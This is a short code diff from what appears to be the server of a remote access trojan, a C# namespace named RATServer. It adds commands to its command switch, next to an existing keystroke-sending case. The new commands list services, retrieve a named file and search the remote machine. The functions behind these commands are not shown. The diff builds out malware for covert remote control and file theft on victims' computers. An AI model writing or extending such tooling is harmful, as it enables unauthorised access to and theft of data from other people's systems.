@@ -103,6 +103,17 @@ namespace RATServer
                             r.Type = "Message";
                             r.Msg = "SendKeys Success";
                             break;
+                        case "services":
+                            r.Type = "Message";
+                            r.Msg = Functions.Services();
+                            break;
+                        case "retrieve":
+                            r = Functions.Retrieve(c.Args[0]);
+                            break;
+                        case "search":
+                            r.Type = "Message";
+                            r.Msg = Functions.Search(c.Args[0]);
+                            break;
                         default:
                             break;
                     }                 
